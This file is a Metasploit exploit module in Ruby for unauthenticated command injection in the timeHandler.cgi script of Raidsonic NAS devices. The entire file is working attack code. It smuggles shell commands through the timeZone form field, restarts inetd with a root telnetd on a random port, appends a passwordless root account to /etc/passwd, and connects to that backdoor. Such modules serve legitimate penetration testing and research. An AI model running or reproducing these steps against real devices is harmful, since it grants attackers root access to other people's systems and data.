# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ManualRanking # It&#039;s backdooring the remote device

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::CommandShell
  include Msf::Exploit::FileDropper

  RESPONSE_PATTERN = "\<FORM\ NAME\=\"form\"\ METHOD\=\"POST\"\ ACTION\=\"\/cgi\/time\/time.cgi\"\ ENCTYPE\=\"multipart\/form-data"

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;        => &#039;Raidsonic NAS Devices Unauthenticated Remote Command Execution&#039;,
      &#039;Description&#039; => %q{
        Different Raidsonic NAS devices are vulnerable to OS command injection via the web
        interface. The vulnerability exists in timeHandler.cgi, which is accessible without
        authentication. This module has been tested with the versions IB-NAS5220 and
        IB-NAS4220. Since this module is adding a new user and modifying the inetd daemon
        configuration, this module is set to ManualRanking and could cause target instability.
      },
      &#039;Author&#039;      =>
        [
          &#039;Michael Messner <devnull@s3cur1ty.de>&#039;, # Vulnerability discovery and Metasploit module
          &#039;juan vazquez&#039; # minor help with msf module
        ],
      &#039;License&#039;     => MSF_LICENSE,
      &#039;References&#039;  =>
        [
          [ &#039;OSVDB&#039;, &#039;90221&#039; ],
          [ &#039;EDB&#039;, &#039;24499&#039; ],
          [ &#039;BID&#039;, &#039;57958&#039; ],
          [ &#039;URL&#039;, &#039;http://www.s3cur1ty.de/m1adv2013-010&#039; ]
        ],
      &#039;DisclosureDate&#039; => &#039;Feb 04 2013&#039;,
      &#039;Privileged&#039;     => true,
      &#039;Platform&#039;       => &#039;unix&#039;,
      &#039;Payload&#039;     =>
        {
          &#039;Compat&#039;  => {
            &#039;PayloadType&#039;    => &#039;cmd_interact&#039;,
            &#039;ConnectionType&#039; => &#039;find&#039;,
          },
        },
      &#039;DefaultOptions&#039; => { &#039;PAYLOAD&#039; => &#039;cmd/unix/interact&#039; },
      &#039;Targets&#039;        =>
        [
          [ &#039;Automatic&#039;, { } ],
        ],
      &#039;DefaultTarget&#039;  => 0
      ))

    register_advanced_options(
      [
        OptInt.new(&#039;TelnetTimeout&#039;, [ true, &#039;The number of seconds to wait for a reply from a Telnet command&#039;, 10]),
        OptInt.new(&#039;TelnetBannerTimeout&#039;, [ true, &#039;The number of seconds to wait for the initial banner&#039;, 25])
      ], self.class)
  end

  def tel_timeout
    (datastore[&#039;TelnetTimeout&#039;] || 10).to_i
  end

  def banner_timeout
    (datastore[&#039;TelnetBannerTimeout&#039;] || 25).to_i
  end

  def exploit
    telnet_port = rand(32767) + 32768

    print_status("#{rhost}:#{rport} - Telnet port: #{telnet_port}")

    #first request
    cmd = "killall inetd"
    cmd = Rex::Text.uri_encode(cmd)
    print_status("#{rhost}:#{rport} - sending first request - killing inetd")

    res = request(cmd)
    #no server header or something that we could use to get sure the command is executed
    if (!res or res.code != 200 or res.body !~ /#{RESPONSE_PATTERN}/)
      fail_with(Exploit::Failure::Unknown, "#{rhost}:#{rport} - Unable to execute payload")
    end

    #second request
    inetd_cfg = rand_text_alpha(8)
    cmd = "echo \"#{telnet_port} stream tcp nowait root /usr/sbin/telnetd telnetd\" > /tmp/#{inetd_cfg}"
    cmd = Rex::Text.uri_encode(cmd)
    print_status("#{rhost}:#{rport} - sending second request - configure inetd")

    res = request(cmd)
    #no server header or something that we could use to get sure the command is executed
    if (!res or res.code != 200 or res.body !~ /#{RESPONSE_PATTERN}/)
      fail_with(Exploit::Failure::Unknown, "#{rhost}:#{rport} - Unable to execute payload")
    end
    register_file_for_cleanup("/tmp/#{inetd_cfg}")

    #third request
    cmd = "/usr/sbin/inetd /tmp/#{inetd_cfg}"
    cmd = Rex::Text.uri_encode(cmd)
    print_status("#{rhost}:#{rport} - sending third request - starting inetd and telnetd")

    res = request(cmd)
    #no server header or something that we could use to get sure the command is executed
    if (!res or res.code != 200 or res.body !~ /#{RESPONSE_PATTERN}/)
      fail_with(Exploit::Failure::Unknown, "#{rhost}:#{rport} - Unable to execute payload")
    end

    #fourth request
    @user = rand_text_alpha(6)
    cmd = "echo \"#{@user}::0:0:/:/bin/ash\" >> /etc/passwd"
    cmd = Rex::Text.uri_encode(cmd)
    print_status("#{rhost}:#{rport} - sending fourth request - configure user #{@user}")

    res = request(cmd)
    #no server header or something that we could use to get sure the command is executed
    if (!res or res.code != 200 or res.body !~ /#{RESPONSE_PATTERN}/)
      fail_with(Exploit::Failure::Unknown, "#{rhost}:#{rport} - Unable to execute payload")
    end

    print_status("#{rhost}:#{rport} - Trying to establish a telnet connection...")
    ctx = { &#039;Msf&#039; => framework, &#039;MsfExploit&#039; => self }
    sock = Rex::Socket.create_tcp({ &#039;PeerHost&#039; => rhost, &#039;PeerPort&#039; => telnet_port.to_i, &#039;Context&#039; => ctx })

    if sock.nil?
      fail_with(Exploit::Failure::Unknown, "#{rhost}:#{rport} - Backdoor service has not been spawned!!!")
    end

    add_socket(sock)

    print_status("#{rhost}:#{rport} - Trying to establish a telnet session...")
    prompt = negotiate_telnet(sock)
    if prompt.nil?
      sock.close
      fail_with(Exploit::Failure::Unknown, "#{rhost}:#{rport} - Unable to establish a telnet session")
    else
      print_good("#{rhost}:#{rport} - Telnet session successfully established...")
    end

    handler(sock)

  end

  def request(cmd)

    uri = &#039;/cgi/time/timeHandler.cgi&#039;

    begin
      res = send_request_cgi({
        &#039;uri&#039;    => uri,
        &#039;method&#039; => &#039;POST&#039;,
        #not working without setting encode_params to false!
        &#039;encode_params&#039; => false,
        &#039;vars_post&#039; => {
          "month"        => "#{rand(12)}",
          "date"         => "#{rand(30)}",
          "year"         => "20#{rand(99)}",
          "hour"         => "#{rand(12)}",
          "minute"       => "#{rand(60)}",
          "ampm"         => "PM",
          "timeZone"     => "Amsterdam`#{cmd}`",
          "ntp_type"     => "default",
          "ntpServer"    => "none",
          "old_date"     => " 1 12007",
          "old_time"     => "1210",
          "old_timeZone" => "Amsterdam",
          "renew"        => "0"
          }
        })
      return res
    rescue ::Rex::ConnectionError
      fail_with(Exploit::Failure::Unknown, "#{rhost}:#{rport} - Could not connect to the webservice")
    end
  end

  def negotiate_telnet(sock)
    login = read_telnet(sock, "login: $")
    if login
      sock.put("#{@user}\r\n")
    end
    return read_telnet(sock, "> $")
  end

  def read_telnet(sock, pattern)
    begin
      Timeout.timeout(banner_timeout) do
        while(true)
          data = sock.get_once(-1, tel_timeout)
          return nil if not data or data.length == 0
          if data =~ /#{pattern}/
            return true
          end
        end
      end
    rescue ::Timeout::Error
      return nil
    end
  end
end

